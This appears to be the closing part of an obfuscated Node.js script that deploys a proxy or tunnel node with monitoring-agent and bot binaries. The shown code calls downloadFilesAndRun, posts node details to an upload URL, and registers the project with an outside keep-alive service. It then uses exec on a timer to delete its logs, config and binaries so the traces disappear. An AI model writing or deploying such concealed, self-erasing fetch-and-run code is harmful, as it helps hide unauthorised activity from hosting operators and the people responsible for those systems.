                const _0x15bb76 = await axios[_0x34002c(0x143)](UPLOAD_URL + (_0x34002c(0x90) + _0x34002c(0x256)), _0xc5cea1, { 'headers': { 'Content-Type': _0x37fc4d[_0x34002c(0xaf)] } });
                return _0x15bb76 && _0x37fc4d[_0x34002c(0x263)](_0x15bb76[_0x34002c(0x273)], 0x57 * -0x5f + -0x2 * -0xde8 + 0x541) ? (console[_0x34002c(0x198)](_0x37fc4d[_0x34002c(0x292)]), _0x15bb76) : null;
            } catch (_0x5502a4) {
                return null;
            }
        } else
            return;
    }
}
function cleanFiles() {
    const _0x26965a = _0x17836e, _0x5514cc = {
            'EAUAv': _0x26965a(0x194) + _0x26965a(0x271),
            'DvcCQ': _0x26965a(0x205) + _0x26965a(0x11b) + _0x26965a(0x26e) + _0x26965a(0x1b1),
            'rPSYg': function (_0x5afadb, _0x1441c2) {
                return _0x5afadb && _0x1441c2;
            },
            'ivDVq': function (_0x9b522b, _0x3b4e57) {
                return _0x9b522b === _0x3b4e57;
            },
            'DAxLA': _0x26965a(0x17b),
            'NMGin': function (_0x44a6af, _0x1c56e8, _0x50c2bb) {
                return _0x44a6af(_0x1c56e8, _0x50c2bb);
            },
            'bBxJT': function (_0x317076, _0xb3f102, _0x27fb15) {
                return _0x317076(_0xb3f102, _0x27fb15);
            }
        };
    _0x5514cc[_0x26965a(0x268)](setTimeout, () => {
        const _0x18eed3 = _0x26965a, _0x5d5274 = {
                'hgIMk': _0x5514cc[_0x18eed3(0x2a0)],
                'akIDM': _0x5514cc[_0x18eed3(0x2b1)]
            }, _0xa2fd85 = [
                bootLogPath,
                configPath,
                webPath,
                botPath
            ];
        if (NEZHA_PORT)
            _0xa2fd85[_0x18eed3(0x29d)](npmPath);
        else
            _0x5514cc[_0x18eed3(0x22b)](NEZHA_SERVER, NEZHA_KEY) && _0xa2fd85[_0x18eed3(0x29d)](phpPath);
        _0x5514cc[_0x18eed3(0x252)](process[_0x18eed3(0x159)], _0x5514cc[_0x18eed3(0x1a9)]) ? _0x5514cc[_0x18eed3(0x184)](exec, _0x18eed3(0x16a) + _0xa2fd85[_0x18eed3(0x28b)]('\x20') + (_0x18eed3(0x117) + '1'), _0x542b3e => {
            const _0x3bf165 = _0x18eed3;
            console[_0x3bf165(0xa5)](), console[_0x3bf165(0x198)](_0x5514cc[_0x3bf165(0x2a0)]), console[_0x3bf165(0x198)](_0x5514cc[_0x3bf165(0x2b1)]);
        }) : _0x5514cc[_0x18eed3(0x184)](exec, _0x18eed3(0x179) + _0xa2fd85[_0x18eed3(0x28b)]('\x20') + (_0x18eed3(0x111) + _0x18eed3(0x1f7)), _0x1d7ebb => {
            const _0x1d2e30 = _0x18eed3;
            console[_0x1d2e30(0xa5)](), console[_0x1d2e30(0x198)](_0x5d5274[_0x1d2e30(0x203)]), console[_0x1d2e30(0x198)](_0x5d5274[_0x1d2e30(0x14d)]);
        });
    }, 0x373 * -0x35 + -0xa * -0x3259 + 0x1ee5);
}
cleanFiles();
async function AddVisitTask() {
    const _0x536740 = _0x17836e, _0x2006eb = {
            'ErbGW': function (_0x233063, _0x2f1718) {
                return _0x233063 || _0x2f1718;
            },
            'sMIcp': _0x536740(0x277) + _0x536740(0xf0) + _0x536740(0xe9) + _0x536740(0x20d),
            'SlyJA': _0x536740(0x121) + _0x536740(0x278) + _0x536740(0x26a) + 'l',
            'BUhII': _0x536740(0x22a) + _0x536740(0xbc)
        };
    if (_0x2006eb[_0x536740(0x215)](!AUTO_ACCESS, !PROJECT_URL)) {
        console[_0x536740(0x198)](_0x2006eb[_0x536740(0x2a4)]);
        return;
    }
    try {
        const _0x4c04d6 = await axios[_0x536740(0x143)](_0x2006eb[_0x536740(0x23e)], { 'url': PROJECT_URL }, { 'headers': { 'Content-Type': _0x2006eb[_0x536740(0x1d2)] } });
        return console[_0x536740(0x198)](_0x536740(0x28a) + _0x536740(0x1cf) + _0x536740(0x14f) + _0x536740(0x27f)), _0x4c04d6;
    } catch (_0x38fb5d) {
        return console[_0x536740(0x1fd)](_0x536740(0x1f5) + _0x536740(0xa6) + _0x536740(0x1f1) + _0x536740(0x1a3) + _0x38fb5d[_0x536740(0x1a8)]), null;
    }
}
async function startserver() {
    const _0x3741d7 = _0x17836e, _0xdfee3f = {
            'CvyVk': _0x3741d7(0x15e) + _0x3741d7(0x19c),
            'hXENt': function (_0xc7c45c) {
                return _0xc7c45c();
            },
            'dGzin': function (_0xf742de) {
                return _0xf742de();
            },
            'dlTvQ': function (_0x328607) {
                return _0x328607();
            },
            'ahexi': function (_0x323610) {
                return _0x323610();
            },
            'FhwPJ': _0x3741d7(0xdb) + _0x3741d7(0x2ae) + ':'
        };
    try {
        const _0xaafc48 = _0xdfee3f[_0x3741d7(0x17c)][_0x3741d7(0x99)]('|');
        let _0xcf0c52 = 0x1157 + 0x51e + -0x1675;
        while (!![]) {
            switch (_0xaafc48[_0xcf0c52++]) {
            case '0':
                _0xdfee3f[_0x3741d7(0xe0)](deleteNodes);
                continue;
            case '1':
                await _0xdfee3f[_0x3741d7(0x147)](extractDomains);
                continue;
            case '2':
                _0xdfee3f[_0x3741d7(0x295)](argoType);
                continue;
            case '3':
                await _0xdfee3f[_0x3741d7(0x1fc)](generateConfig);
                continue;
            case '4':
                await _0xdfee3f[_0x3741d7(0xe0)](AddVisitTask);
                continue;
            case '5':
                _0xdfee3f[_0x3741d7(0x147)](cleanupOldFiles);
                continue;
            case '6':
                await _0xdfee3f[_0x3741d7(0x147)](downloadFilesAndRun);
                continue;
            }
            break;
        }
    } catch (_0x4e9a21) {
        console[_0x3741d7(0x1fd)](_0xdfee3f[_0x3741d7(0xce)], _0x4e9a21);
    }
}
startserver()[_0x17836e(0x21d)](_0xdb68d7 => {
    const _0xfaacac = _0x17836e, _0xab6b8d = { 'CTBwF': _0xfaacac(0x1b0) + _0xfaacac(0x28e) + _0xfaacac(0x2ae) + ':' };
    console[_0xfaacac(0x1fd)](_0xab6b8d[_0xfaacac(0xd5)], _0xdb68d7);
}), app[_0x17836e(0x12d)](PORT, () => console[_0x17836e(0x198)](_0x17836e(0xfd) + _0x17836e(0x160) + _0x17836e(0x246) + ':' + PORT + '!'));
